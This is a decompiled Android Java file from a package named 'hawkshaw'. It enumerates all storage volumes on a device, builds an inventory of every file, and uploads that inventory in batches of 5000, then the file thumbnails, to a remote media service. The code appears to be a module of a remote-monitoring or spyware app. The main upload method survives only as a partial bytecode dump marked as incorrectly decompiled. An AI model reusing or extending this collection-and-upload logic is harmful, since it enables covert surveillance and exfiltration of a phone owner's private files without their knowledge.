package com.hawkshaw.library.features.media.files;

import E.k;
import P1.b;
import X2.o;
import Y1.K;
import android.content.Context;
import android.os.Build;
import android.os.storage.StorageManager;
import android.os.storage.StorageVolume;
import android.webkit.MimeTypeMap;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.AppFileV2;
import com.hawkshaw.library.datalayer.models.Timestamp;
import com.hawkshaw.library.ktextensions.CollectionsKt;
import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import q3.m;

public final class FileExplorerWalkV2Kt {
    private static final String TAG = "FileExplorerWalkV2";

    public static final List<File> getExternalStorageVolumes(Context context) {
        List<StorageVolume> storageVolumes;
        K.n(context, "context");
        ArrayList arrayList = new ArrayList();
        Class cls = StorageManager.class;
        if (Build.VERSION.SDK_INT >= 31) {
            StorageManager storageManager = (StorageManager) k.getSystemService(context, cls);
            if (!(storageManager == null || (storageVolumes = storageManager.getStorageVolumes()) == null)) {
                for (StorageVolume h5 : storageVolumes) {
                    arrayList.add(h5.getDirectory());
                }
            }
        } else {
            try {
                Method method = cls.getMethod("getVolumeList", new Class[0]);
                Object systemService = context.getSystemService("storage");
                Object invoke = method.invoke(systemService instanceof StorageManager ? (StorageManager) systemService : null, new Object[0]);
                K.l(invoke, "null cannot be cast to non-null type kotlin.Array<kotlin.Any>");
                for (Object obj : (Object[]) invoke) {
                    Object invoke2 = obj.getClass().getMethod("getPath", new Class[0]).invoke(obj, new Object[0]);
                    K.l(invoke2, "null cannot be cast to non-null type kotlin.String");
                    arrayList.add(new File((String) invoke2));
                }
            } catch (Exception e5) {
                e5.printStackTrace();
            }
        }
        ArrayList arrayList2 = new ArrayList();
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            Object next = it.next();
            if (next != null) {
                arrayList2.add(next);
            }
        }
        if (Build.VERSION.SDK_INT >= 30) {
            CollectionsKt.plusSafe(arrayList2, App.Companion.getContext().getExternalFilesDir((String) null));
        }
        return arrayList2;
    }

    private static final q3.k getFiles(Context context) {
        return m.d0(o.N0(getExternalStorageVolumes(context)), b.f1624G);
    }

    public static /* synthetic */ q3.k getFiles$default(Context context, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            context = App.Companion.getContext();
        }
        return getFiles(context);
    }

    /* JADX WARNING: type inference failed for: r1v4, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x0040  */
    /* JADX WARNING: Removed duplicated region for block: B:17:0x0065  */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x00ac  */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x00cb A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x00cc A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0027  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushFileExplorerWalkV2(a3.e r24) {
        /*
            r0 = r24
            boolean r1 = r0 instanceof P1.c
            if (r1 == 0) goto L_0x0015
            r1 = r0
            P1.c r1 = (P1.c) r1
            int r2 = r1.f1629G
            r3 = -2147483648(0xffffffff80000000, float:-0.0)
            r4 = r2 & r3
            if (r4 == 0) goto L_0x0015
            int r2 = r2 - r3
            r1.f1629G = r2
            goto L_0x001a
        L_0x0015:
            P1.c r1 = new P1.c
            r1.<init>(r0)
        L_0x001a:
            java.lang.Object r0 = r1.f1628F
            b3.a r2 = b3.C0298a.f4140D
            int r3 = r1.f1629G
            W2.y r4 = W2.y.f2418a
            r5 = 1
            r6 = 0
            r7 = 2
            if (r3 == 0) goto L_0x0040
            if (r3 == r5) goto L_0x0038
            if (r3 != r7) goto L_0x0030
            Y1.C0110h.P(r0)
            goto L_0x00cc
        L_0x0030:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0038:
            int r3 = r1.f1626D
            java.util.Iterator r8 = r1.f1627E
            Y1.C0110h.P(r0)
            goto L_0x008c
        L_0x0040:
            Y1.C0110h.P(r0)
            q3.k r0 = getFiles$default(r6, r5, r6)
            java.lang.String r3 = "<this>"
            Y1.K.n(r0, r3)
            r3 = 5000(0x1388, float:7.006E-42)
            Y1.K.o(r3, r3)
            java.util.Iterator r0 = r0.iterator()
            r8 = 0
            java.util.Iterator r0 = Y1.K.H0(r0, r3, r3, r5, r8)
            r23 = r8
            r8 = r0
            r0 = r23
        L_0x005f:
            boolean r3 = r8.hasNext()
            if (r3 == 0) goto L_0x00b2
            java.lang.Object r3 = r8.next()
            int r9 = r0 + 1
            if (r0 < 0) goto L_0x00ae
            java.util.List r3 = (java.util.List) r3
            com.hawkshaw.library.datalayer.models.PushFileExplorerWalkV2Request r10 = new com.hawkshaw.library.datalayer.models.PushFileExplorerWalkV2Request
            r10.<init>(r0, r3)
            com.hawkshaw.library.datalayer.Injector$Companion r0 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r0 = r0.getInstance()
            com.hawkshaw.library.datalayer.network.service.MediaService r0 = r0.getMediaService()
            r1.f1627E = r8
            r1.f1626D = r9
            r1.f1629G = r5
            java.lang.Object r0 = r0.pushFileExplorerWalkV2(r10, r1)
            if (r0 != r2) goto L_0x008b
            return r2
        L_0x008b:
            r3 = r9
        L_0x008c:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r0 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r0
            boolean r9 = r0.isSuccess()
            if (r9 != 0) goto L_0x00ac
            com.hawkshaw.library.logger.Logger r10 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r0 = r0.getErrorMessage()
            java.lang.String r1 = "PushFileExplorerWalkV2: "
            java.lang.String r12 = i.C0528x.h(r1, r0)
            r13 = 0
            r14 = 0
            java.lang.String r11 = "FileExplorerWalkV2"
            r15 = 12
            r16 = 0
            com.hawkshaw.library.logger.Logger.e$default(r10, r11, r12, r13, r14, r15, r16)
            return r4
        L_0x00ac:
            r0 = r3
            goto L_0x005f
        L_0x00ae:
            Y1.K.z0()
            throw r6
        L_0x00b2:
            com.hawkshaw.library.logger.Logger r17 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r19 = "FileExplorer files uploaded successfully"
            r20 = 0
            java.lang.String r18 = "FileExplorerWalkV2"
            r21 = 4
            r22 = 0
            com.hawkshaw.library.logger.Logger.d$default(r17, r18, r19, r20, r21, r22)
            r1.f1627E = r6
            r1.f1629G = r7
            java.lang.Object r0 = com.hawkshaw.library.features.media.filecrud.ThumbnailsUtilsNewKt.pushThumbnailsNew(r1)
            if (r0 != r2) goto L_0x00cc
            return r2
        L_0x00cc:
            return r4
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.files.FileExplorerWalkV2Kt.pushFileExplorerWalkV2(a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    public static final AppFileV2 toAppFile(File file) {
        String name = file.getName();
        K.m(name, "getName(...)");
        String path = file.getPath();
        K.m(path, "getPath(...)");
        return new AppFileV2(name, path, MimeTypeMap.getSingleton().getMimeTypeFromExtension(X2.k.M(file)), new Timestamp(file.lastModified()), file.length());
    }
}
